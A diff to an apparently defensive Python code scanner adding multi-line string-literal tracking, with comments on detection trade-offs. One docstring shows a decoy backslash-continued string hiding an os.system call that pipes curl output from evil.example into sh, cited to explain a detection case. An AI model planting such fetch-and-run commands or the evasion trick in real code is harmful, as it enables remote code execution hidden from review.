@@ -149,6 +149,110 @@ def in_string_literal(line: str, index: int) -> bool:
     return quote is not None
 
 
+def _literal_after(line: str, open_delim: str | None) -> str | None:
+    """The literal still open when this line ends, given the one open at its start.
+
+    Left to right, because that is the only order in which a quote, a comment
+    marker and an escape mean what they mean. Scanning for any of them
+    independently is how a `#` inside a string, or a triple quote inside a
+    comment, gets read as the thing it only looks like.
+    """
+    i, n = 0, len(line)
+    while i < n:
+        if open_delim is not None:
+            if len(open_delim) == 3:
+                closer = line.find(open_delim, i)
+                if closer < 0:
+                    return open_delim
+                i = closer + 3
+                open_delim = None
+                continue
+            ch = line[i]
+            if ch == "\\":
+                i += 2
+                continue
+            if ch == open_delim:
+                open_delim = None
+            i += 1
+            continue
+        ch = line[i]
+        # Outside a literal, `#` ends the line. This is the same promise
+        # `_triple_opener` makes — a marker inside a comment opens nothing —
+        # and here it falls out of the scan order instead of a second check.
+        if ch == "#":
+            break
+        if ch in "\"'":
+            # `ch * 3`, never a triple-quote token spelled out as a literal.
+            # Writing one here opens a phantom docstring when the scanner reads
+            # its own source: `_triple_opener` takes the first marker on a line
+            # without asking whether it sits inside an ordinary string, so a
+            # tuple of quote spellings reads as a docstring opener, runs to the
+            # next marker, and inverts every position after it. Measured: the
+            # literal form put 12 findings into the self-scan headline. That
+            # defect predates this function and is not its business to fix —
+            # but tripping it while adding a guard would be this function's.
+            triple = ch * 3
+            if line.startswith(triple, i):
+                open_delim, i = triple, i + 3
+            else:
+                open_delim, i = ch, i + 1
+            continue
+        i += 1
+    # A one-character quote does not survive the newline on its own: unclosed,
+    # it is a syntax error UNLESS the line ends in a backslash continuation.
+    # Carrying it regardless would let one stray apostrophe silence a whole file.
+    if open_delim is not None and len(open_delim) == 1 and not line.endswith("\\"):
+        return None
+    return open_delim
+
+
+def string_literal_carry(text: str) -> list[bool]:
+    """Per line: was a string literal already open when the line began?
+
+    The multi-line answer `in_string_literal` cannot give. That function asks
+    about an index on one line, which is the right question for a match inside a
+    literal and the wrong one for a STATEMENT: a triple-quoted block is data that
+    outlives its line, and every line of it looks like ordinary source in
+    isolation.
+
+    Reachability is where that gap had teeth. `_python_imports` matched import
+    syntax line by line, so a docstring, a usage example, or any triple-quoted
+    block naming a module produced a real edge — and in that model an edge is a
+    claim that some file is reachable, so a fabricated one deletes the BND-001
+    that says nothing wires the file up. Attacker-controlled, and one line long.
+
+    State is per call and therefore per file: an unterminated literal — which a
+    truncated or hostile file has — carries to the end of THAT file and no
+    further. A fix that leaked across files would suppress more than the defect.
+
+    Both triple-quoted spans and backslash-continued single-line literals count;
+    they are the only two ways a literal survives a newline. The span includes
+    the closing line (it begins inside the literal) and excludes the opening one
+    (it begins outside), which is exactly the question a statement asks.
+
+    NOT a position signal, and `_classify_code` deliberately does not call it.
+    Feeding this state into classification was tried and it cost detections:
+    "this line is inside a literal" and "this line is inert" are different
+    claims, and they come apart wherever a literal spans a newline by backslash.
+    There the line that opens the literal — or the line that closes it, if the
+    backslash sits inside a decoy — is the line that RUNS:
+
+        BANNER = 'backup helper v1\\
+        '; os.system('curl -sf https://evil.example/x | sh')
+
+    Classifying that second line documentary floors its confidence to low, drops
+    it from the headline and makes taint skip it, all of it upstream of the
+    `literal_demotion` carve-out that exists to keep a live sink live. Answering
+    the reachability question is worth a function; it is not worth that.
+    """
+    carry: list[bool] = []
+    open_delim: str | None = None
+    for line in text.splitlines():
+        carry.append(open_delim is not None)
+        open_delim = _literal_after(line, open_delim)
+    return carry
+
+
 # A regex literal is definitionally a *description* of a pattern, not a value.
 # This is the source-code equivalent of a markdown table row: the strongest
 # available signal that the dangerous text is catalogued, not invoked.
@@ -403,6 +507,11 @@ def _classify_code(lines: list[str], base: str, suffix: str) -> list[tuple[str, 
     if suffix not in _TRIPLE_QUOTE_SUFFIXES:
         return [(ACTIVE, STRUCTURAL)] * len(lines)
 
+    # This loop keeps its own triple-quote state rather than reusing
+    # `string_literal_carry`, and that separation is deliberate — see the note
+    # in that function. Position asks whether a line is INERT; carry asks
+    # whether a line sits inside a literal. A backslash continuation is where
+    # the two answers diverge, and the divergence is worth a detection.
     positions: list[tuple[str, str]] = []
     in_docstring = False
     delim = ""
